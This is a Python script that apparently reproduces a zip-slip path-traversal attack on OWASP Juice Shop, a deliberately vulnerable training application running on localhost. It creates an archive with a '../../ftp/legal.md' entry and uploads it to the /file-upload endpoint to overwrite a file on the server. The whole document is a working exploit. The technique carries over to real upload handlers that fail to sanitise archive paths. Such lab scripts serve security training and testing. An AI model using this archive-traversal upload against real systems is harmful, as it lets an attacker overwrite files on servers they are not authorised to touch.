import os
import shutil
import zipfile
import requests


def replicate_vulnerable_components(juiceshop_url):
    """Replicates the Vulnerable and Outdated Components security risk on Juice Shop.
       Security risk is invoked by uploading a zip file that contains paths to
       overwrite files in the FTP. """
    cwd = os.getcwd()

    # create folders to traverse
    cwd_folder = os.getcwd()
    for i in range(0, 2):
        cwd_folder = create_folder(cwd_folder, 'folder')

    # replicate ftp folder
    cwd_ftp = create_folder(cwd, 'ftp')

    # create md file
    with open(os.path.join(cwd_ftp, 'legal.md'), "w") as file:
        file.write("File has been changed!")

    os.chdir(cwd_folder)

    with zipfile.ZipFile('exploit.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(r'../../ftp/legal.md')

    # upload the zip file as a POST request
    zf = open('exploit.zip', 'rb')
    try:
        r = requests.post(juiceshop_url+r"/file-upload", files={"file": ('exploit.zip', zf)})
    except requests.exceptions.ConnectionError as ec:
        print("Connection Error.")
    except requests.exceptions.Timeout as et:
        print("Timeout Error.")
    zf.close()

    # delete temporary folders
    delete_folder(cwd, 'folder')
    delete_folder(cwd, 'ftp')

    if r.status_code == 204:
        return rf"Exploit ZIP successfully uploaded.  {juiceshop_url}/ftp/legal.md"
    else:
        return f"Status Code: {r.status_code}"


def delete_folder(wd_path, folder_name):
    """Deletes folder by taking in location of folder and folder_name.
    Produces error if unable to delete. """
    os.chdir(wd_path)
    delete_path = os.path.join(wd_path, folder_name)
    try:
        shutil.rmtree(delete_path)
    except OSError as e:
        print(f"Error: Cannot delete {delete_path}. ")


def create_folder(wd_path, folder_name):
    """Creates folder by taking in location of folder and folder name.
    Returns the path including the folder. """
    cwd_folder = os.path.join(wd_path, folder_name)
    if not os.path.exists(cwd_folder):
        os.makedirs(cwd_folder)
    return cwd_folder


if __name__ == '__main__':
    url = r'http://localhost:3000'
    print(replicate_vulnerable_components(url))
